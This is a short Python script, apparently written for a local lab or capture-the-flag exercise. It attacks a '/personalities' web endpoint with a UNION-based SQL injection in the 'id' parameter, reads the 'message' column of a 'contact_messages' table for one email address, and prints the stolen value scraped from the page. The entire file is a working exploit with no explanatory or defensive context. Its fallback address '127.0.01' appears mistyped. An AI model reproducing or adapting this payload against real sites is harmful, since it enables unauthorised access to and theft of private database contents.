import sys
import requests
from bs4 import BeautifulSoup


#TCP_IP = '127.0.0.1'
addr = "172.17.0.2" if len(sys.argv) > 1 else "127.0.01"
data = {"id":"1' union all select count(*),message from contact_messages where mail = 'james@bond.mi5'; #"}


targetURL = 'http://' + addr + '/personalities' # target url

#targetURL = 'http://addr/personalities' # target url

result = requests.get(targetURL,data) 
souper = BeautifulSoup(result.content, "html.parser")
print(souper.find_all('a')[1].get_text().split(":")[1]) 
